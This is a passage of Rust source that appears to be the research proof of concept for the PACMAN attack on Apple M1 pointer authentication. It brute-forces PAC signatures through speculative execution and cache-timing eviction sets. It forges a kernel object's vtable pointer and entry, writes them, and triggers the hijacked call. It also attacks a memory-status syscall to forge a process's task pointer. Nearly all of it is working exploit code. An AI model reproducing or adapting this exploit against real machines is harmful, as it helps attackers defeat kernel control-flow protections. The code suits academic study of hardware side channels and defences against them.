            // This is ignored by differentiate (in favor of the correct/ incorrect ptr args),
            // and is the pointer to forge for bruteforce
            inner_guess_ptr: win | PAC_BITMASK,
        }
    );

    if !do_bruteforce {
        let incorrect_pac = correct_pac ^ (crandom::rand() as u16 % pac::MAX_PAC);
        let incorrect_signed_new_vtable_entry = pac::encode_pac(incorrect_pac, win | PAC_BITMASK);

        assert_ne!(correct_pac, incorrect_pac);
        assert_ne!(correct_signed_new_vtable_entry, incorrect_signed_new_vtable_entry);
        // Try just one correct and one incorrect, see if we can tell them apart:
        println!("Forging vtable entry (PacmanKitService::externalMethod) in PacmanKitService`vtable");
        println!("\tOriginal pointer:      0x{:X} (pac is 0x{:X})", victim_vtable_entry, pac::extract_pac(victim_vtable_entry));
        println!("\tIncorrect new pointer: 0x{:X} (pac is 0x{:X})", incorrect_signed_new_vtable_entry, pac::extract_pac(incorrect_signed_new_vtable_entry));
        println!("\tCorrect new pointer:   0x{:X} (pac is 0x{:X})", correct_signed_new_vtable_entry, pac::extract_pac(correct_signed_new_vtable_entry));
        pacman_differentiate::<_, _, INST_NUM_TRIALS, INST_NUM_ITERS, INST_EVSET_SIZE, INST_MISS_LATENCY>(
            &handle,
            target,
            // Inner holder correct/ incorrect:
            correct_signed_new_vtable_entry,
            incorrect_signed_new_vtable_entry,
            timer::time_exec,
            try_speculative,
            try_nonspeculative,
            &win_evset_chosen,
            &mut win_indexes,
            &limit_evset_chosen,
            &mut limit_indexes
        );
    }
    else {
        println!("Brute-forcing vtable entry (PacmanKitService::externalMethod) in PacmanKitService`vtable");
        println!("\tOriginal pointer:      0x{:X} (pac is 0x{:X})", victim_vtable_entry, pac::extract_pac(victim_vtable_entry));
        println!("\tWant to find:          0x{:X} (pac is 0x{:X})", correct_signed_new_vtable_entry, pac::extract_pac(correct_signed_new_vtable_entry));
        pacman_bruteforce::<_, _, INST_NUM_TRIALS, INST_NUM_ITERS, INST_NUM_FINAL_ITERS, INST_EVSET_SIZE, INST_MISS_LATENCY>(
            &handle,
            target,
            timer::time_exec,
            try_speculative,
            try_nonspeculative,
            &win_evset_chosen,
            &mut win_indexes,
            &limit_evset_chosen,
            &mut limit_indexes
        );
    }
}

pub unsafe fn end_to_end(memory_region: &mut [u8]) {
    // Handle is used for interfacing with PacmanKit
    let handle = PacmanKitConnection::init().unwrap();

    // Victim handle gives us a victim IOUserClient to exploit
    let victim_handle = PacmanKitConnection::init().unwrap();

    // Locate target object
    let (victim_user_client, victim_object, victim_vtable, victim_vtable_entry) = find_victim_objects(&victim_handle);

    // Data attack will find new_vtable_signed
    let new_vtable = (handle.kernel_mmap().unwrap() | PAC_BITMASK) + 0x24c940;

    // Inst attack will find win_signed
    let win = handle.leak_retpoline().unwrap() | PAC_BITMASK + 0x30c0;

    // Setup evset for LIMIT
    let limit_va = handle.leak_limit_location().unwrap();
    let limit_pa = handle.kernel_virt_to_phys(limit_va).unwrap();
    let limit_evset = evset::data_pevset(limit_va, limit_pa, memory_region);
    let mut limit_evset_chosen : Vec<u64> = limit_evset.choose_multiple(&mut rand::thread_rng(), LIMIT_EVSET_SIZE).into_iter().cloned().collect();
    let mut limit_indexes : Vec<usize> = (0..limit_evset_chosen.len()).collect();

    // Setup evset for the vtable (success data pointer)
    let new_vtable_va = new_vtable;
    let new_vtable_pa = handle.kernel_virt_to_phys(new_vtable_va).unwrap();
    let new_vtable_evset = evset::data_pevset(new_vtable_va, new_vtable_pa, memory_region);
    let mut new_vtable_evset_chosen : Vec<u64> = new_vtable_evset.choose_multiple(&mut rand::thread_rng(), DATA_EVSET_SIZE).into_iter().cloned().collect();
    let mut new_vtable_indexes : Vec<usize> = (0..new_vtable_evset_chosen.len()).collect();

    // Setup evset for win() (success inst pointer)
    let win_va = win;
    let win_pa = handle.kernel_virt_to_phys(win_va).unwrap();
    let win_evset = evset::inst_pevset(win_va, win_pa, memory_region);
    let mut win_evset_chosen : Vec<u64> = win_evset.choose_multiple(&mut rand::thread_rng(), INST_EVSET_SIZE).into_iter().cloned().collect();
    let mut win_indexes : Vec<usize> = (0..win_evset_chosen.len()).collect();

    // Closures for both attacks
    let try_speculative = || {
        victim_handle.call_service_routine(10000, 0, 0, 0, 0, 0);
    };

    let try_nonspeculative = || {
        victim_handle.call_service_routine(0, 0, 0, 0, 0, 0);
    };

    // 1. DATA ATTACK -> Finds new_vtable_signed

    // Print the correct answer to the screen- note that we can never rely on DATA_ORACLE (we must generate the value ourselves!)
    let salt_data = get_salt(victim_object | PAC_BITMASK, 0xd986);
    let DATA_ORACLE = handle.forge_sign_data(new_vtable | PAC_BITMASK, salt_data).unwrap();
    println!("Brute-forcing vtable pointer in PacmanKitService");
    println!("\tOriginal pointer:      0x{:X} (pac is 0x{:X})", victim_vtable, pac::extract_pac(victim_vtable));
    println!("\tWant to find:          0x{:X} (pac is 0x{:X})", DATA_ORACLE, pac::extract_pac(DATA_ORACLE));

    let data_target = PacmanAttackTarget::Direct(
        DirectTarget{
            holder: victim_object,
            train_ptr: victim_vtable,
            guess_ptr: new_vtable | PAC_BITMASK,
        }
    );

    let new_vtable_signed = match pacman_bruteforce::<_, _, DATA_NUM_TRIALS, DATA_NUM_ITERS, DATA_NUM_FINAL_ITERS, DATA_EVSET_SIZE, DATA_MISS_LATENCY>(
        &handle,
        data_target,
        timer::time_access,
        &try_speculative,
        &try_nonspeculative,
        &new_vtable_evset_chosen,
        &mut new_vtable_indexes,
        &limit_evset_chosen,
        &mut limit_indexes
    ) {
        Some(x) => x,
        None => { panic!("Couldn't find the data solution!"); }
    };

    if new_vtable_signed != DATA_ORACLE {
        panic!("Aborting early to prevent your kernel from panicking- the data pointer was INCORRECT!");
    }

    // 2. INST ATTACK -> Finds win_signed for new_vtable

    // Print the correct answer to the screen- note that we can never rely on INST_ORACLE (we must generate the value ourselves!)
    let salt_inst = get_salt(new_vtable | PAC_BITMASK, 0xa7d5);
    let INST_ORACLE = handle.forge_sign_inst(win | PAC_BITMASK, salt_inst).unwrap();

    println!("Brute-forcing vtable entry (PacmanKitService::externalMethod) in PacmanKitService`vtable");
    println!("\tOriginal pointer:      0x{:X} (pac is 0x{:X})", victim_vtable_entry, pac::extract_pac(victim_vtable_entry));
    println!("\tWant to find:          0x{:X} (pac is 0x{:X})", INST_ORACLE, pac::extract_pac(INST_ORACLE));

    let inst_target = PacmanAttackTarget::Indirect(
        IndirectTarget{
            outer_holder: victim_object,
            inner_holder: new_vtable,
            outer_train_ptr: victim_vtable,

            // Found by data attack:
            outer_guess_ptr: new_vtable_signed,

            // Want to find the correct signature for win():
            inner_guess_ptr: win | PAC_BITMASK,
        }
    );

    let win_signed = match pacman_bruteforce::<_, _, INST_NUM_TRIALS, INST_NUM_ITERS, INST_NUM_FINAL_ITERS, INST_EVSET_SIZE, INST_MISS_LATENCY>(
        &handle,
        inst_target,
        timer::time_exec,
        &try_speculative,
        &try_nonspeculative,
        &win_evset_chosen,
        &mut win_indexes,
        &limit_evset_chosen,
        &mut limit_indexes
    ) {
        Some(x) => x,
        None => { panic!("Couldn't find the inst solution!"); }
    };

    if win_signed != INST_ORACLE {
        panic!("Aborting early to prevent your kernel from panicking- the inst pointer was INCORRECT!");
    }

    println!("Bruteforced all the way!");

    // Give it a use:
    handle.kernel_write(new_vtable, win_signed);
    handle.kernel_write(victim_object, new_vtable_signed);
    try_nonspeculative();
}

pub const SYS_MEMORYSTATUS_AVAILABLE_MEMORY : u64 = 534;

pub static mut PRESSURE_THREAD_STARTED : bool = false;

pub static mut PRESSURE_EVSET : Vec<u64> = Vec::new();

pub unsafe fn memorystatus_available_memory() -> u64 {
    let retval : u64;
    asm!{
        "svc #0",
        in("x8") SYS_MEMORYSTATUS_AVAILABLE_MEMORY,
        in("x16") SYS_MEMORYSTATUS_AVAILABLE_MEMORY,
        lateout("x0") retval,
    }
    return retval;
}

/// Attack memorystatus_available_memory system call to forge proc.task
pub unsafe fn pacman_real(memory_region: &mut [u8]) {
    const NUM_ITERS : usize = 8;
    const NUM_TRIALS : usize = 12;
    const MISS_LATENCY : u64 = 62;
    const EVSET_SIZE : usize  = 12;

    let handle = PacmanKitConnection::init().unwrap();
    let proc = handle.current_proc().unwrap() | PAC_BITMASK;
    let holder = proc + 0x10;
    let proc_task_original_signed = handle.kernel_read(holder).unwrap();
    let proc_task_original = handle.kernel_read(holder).unwrap() | PAC_BITMASK;

    let proc_task_new = (handle.kernel_mmap().unwrap() | PAC_BITMASK) + 0x4000;
    handle.kernel_read(proc_task_new).unwrap();

    let salt_data = get_salt(holder, 0xa08a);
    let proc_task_new_correct = handle.forge_sign_data(proc_task_new, salt_data).unwrap();

    let correct_pac = pac::extract_pac(proc_task_new_correct);
    let incorrect_pac = correct_pac ^ (crandom::rand() as u16 % pac::MAX_PAC);
    let proc_task_new_incorrect = pac::encode_pac(incorrect_pac, proc_task_new_correct | PAC_BITMASK);

    assert_ne!(correct_pac, incorrect_pac);
    assert_ne!(proc_task_new_correct, proc_task_new_incorrect);

    // Setup evset for LIMIT (UNUSED HERE)
    let limit_va = proc + 0x560;
    let limit_pa = handle.kernel_virt_to_phys(limit_va).unwrap();
    let limit_evset = evset::data_pevset(limit_va, limit_pa, memory_region);
    let mut limit_evset_chosen : Vec<u64> = limit_evset.choose_multiple(&mut rand::thread_rng(), LIMIT_EVSET_SIZE).into_iter().cloned().collect();
    let mut limit_evset_indexes : Vec<usize> = (0..limit_evset_chosen.len()).collect();

    PRESSURE_EVSET = limit_evset_chosen.clone();

    // Setup evset for the vtable (success data pointer)
    let new_vtable_va = (proc_task_new_correct + 0x338) | PAC_BITMASK; // +0x338
    let new_vtable_pa = handle.kernel_virt_to_phys(new_vtable_va).unwrap();
    let new_vtable_evset = evset::data_pevset(new_vtable_va, new_vtable_pa, memory_region);
    let mut evset_chosen : Vec<u64> = new_vtable_evset.choose_multiple(&mut rand::thread_rng(), EVSET_SIZE).into_iter().cloned().collect();
    let mut evset_indexes : Vec<usize> = (0..evset_chosen.len()).collect();

    println!("{:X?}", evset_chosen);
    // loop{}

    println!("Differentiating proc.task");
    println!("\tproc is at 0x{:X}", proc);
    println!("\tproc.task:               0x{:X}", proc_task_original);
    println!("\tCorrect new pointer:     0x{:X}", proc_task_new_correct);
    println!("\tIncorrect new pointer:   0x{:X}", proc_task_new_incorrect);

    let target = PacmanAttackTarget::Direct(
        DirectTarget{
            holder: holder,
            train_ptr: proc_task_original_signed,
            guess_ptr: proc_task_new | PAC_BITMASK,
        }
    );

    let try_speculative = || {
        handle.kernel_write(proc + 0x560, 0).unwrap();
        memorystatus_available_memory();
    };

    let try_nonspeculative = || {
        handle.kernel_write(proc + 0x560, 1).unwrap();
        memorystatus_available_memory();
    };

    // DO IT ALL INLINE:
    let correct_ptr = proc_task_new_correct;
    let incorrect_ptr = proc_task_new_incorrect;
    let known_good = proc_task_original_signed;
    let time_use_fn = timer::time_access;

    let mut results = [[0; NUM_ITERS]; NUM_TRIALS];

    let mut use_correct_pac = [false; NUM_TRIALS];
    for i in 0..NUM_TRIALS {
        use_correct_pac[i] = crandom::rand() % 2 == 0;
    }

    // Always ensure we get one false and one true
    use_correct_pac[0] = false;
    use_correct_pac[1] = true;

    // Spawn workers to put pressure on the cache
    for _ in 0..4 {
        thread::spawn(|| {
            if !set_core(CoreKind::PCORE) {
                panic!("Error setting CPU affinity!");
            }
            write_volatile(&mut PRESSURE_THREAD_STARTED, true);
            loop {
                for i in 0..PRESSURE_EVSET.len() {
                    // timer::time_access(limit_evset_chosen_copy[limit_evset_indexes_copy[i]]);
                    // timer::time_access has ISBs in the way- we want to go as fast as possible (do as many loads as we can!)
                    asm!{
                        "ldr {val_out}, [{addr}]",
                        val_out = out(reg) _,
                        addr = in(reg) PRESSURE_EVSET[i],
                    }
                }
            }
        });
    }

    while !read_volatile(&PRESSURE_THREAD_STARTED) {}

    // thread::sleep(core::time::Duration::from_millis(1000));

    for trial in 0..NUM_TRIALS {
        let value_to_use = if use_correct_pac[trial] {correct_ptr} else {incorrect_ptr};
        let mut samples = [0; NUM_ITERS];

        for iteration in 0..NUM_ITERS+1 {
            // Run a single test case

            assert_eq!(evset_chosen.len(), EVSET_SIZE);

            // 1. Train branch predictor on known good pointer
            handle.kernel_write(holder | PAC_BITMASK, known_good);
            handle.kernel_write(proc + 0x560, 1).unwrap();
            for i in 0..4096 {
                memorystatus_available_memory();
            }

            // 2. Write guess
            handle.kernel_write(proc + 0x560, 0).unwrap();
            handle.kernel_write(holder | PAC_BITMASK, value_to_use);

            // 3. Evict LIMIT- this is ALWAYS a data access!
            for i in 0..limit_evset_indexes.len() {
                timer::time_access(limit_evset_chosen[limit_evset_indexes[i]]);
            }

            // 4. Prime the cache
            for i in 0..EVSET_SIZE {
                time_use_fn(evset_chosen[evset_indexes[i]]);
            }

            // 5. Try guess (speculatively)
            memorystatus_available_memory();

            // 6. Probe (go backwards with .rev() if you want to prevent self-eviction!)
            let mut times = [0; EVSET_SIZE];
            for i in (0..EVSET_SIZE) {
                times[i] = time_use_fn(evset_chosen[evset_indexes[i]]);
            }

            // 7. Cleanup nicely
            handle.kernel_write(holder | PAC_BITMASK, known_good);
            handle.kernel_write(proc + 0x560, 0).unwrap();

            // Record the number of misses
            let mut misses = 0;
            for i in 0..EVSET_SIZE {
                if times[i] > MISS_LATENCY {
                    misses += 1;
                }
            }

            // Skip the first run
            if iteration != 0 {
                samples[iteration-1] = misses;
            }
        }
        results[trial] = samples;
    }

    // Post-process and print out results for graphing/ testing
    for i in 0..NUM_TRIALS {
        if use_correct_pac[i] {
            print!("[*] ");
        }
        else {
            print!("[x] ");
        }

        results[i].sort();
        let mut avg : f64 = 0.0;
        let mut total : u64 = 0;
        for j in 0..results[i].len() {
            avg += results[i][j] as f64;
            total += results[i][j]
        }
        avg /= results[i].len() as f64;
        let median = results[i][results[i].len() / 2];
        let max = results[i][results[i].len() - 2];
        let min = results[i][2];
        print!("{}, {}, {}, {}, {}\t", min, median, max, avg, total);
        println!("{:?}", results[i]);
    }
}
